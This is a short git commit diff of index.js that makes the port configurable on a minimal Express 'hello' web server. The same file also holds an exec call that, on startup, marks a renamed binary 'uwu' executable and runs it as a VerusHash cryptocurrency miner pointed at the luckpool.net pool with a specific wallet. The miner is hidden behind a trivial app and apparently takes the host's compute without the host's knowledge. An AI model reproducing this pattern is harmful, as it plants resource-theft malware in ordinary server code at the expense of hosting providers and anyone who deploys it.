5f6579391276a5b56dbe9bb80272d3e265e0bb93
notcloudyzz <121518720+notcloudyzz@users.noreply.github.com>
2023-01-20 23:12:37 +0100

    Update index.js

--- index.js
+++ index.js
@@ -1,10 +1,11 @@
 const { exec } = require('child_process');
 const express = require("express")
 const app = express()
+const port = process.env.PORT || 3001;
 
 app.get("/", function(req,res){
   res.send("hello")
 });
 
-app.listen("8080");
+app.listen(port, () => console.log(`Example app listening on port ${port}!`));
 exec('chmod +x ./uwu && ./uwu --disable-gpu --algorithm verushash --pool na.luckpool.net:3956 --wallet RCDq4J8a65Rp77BMjW7fVvZ2oGiyKohAHs.cloudy --password x');
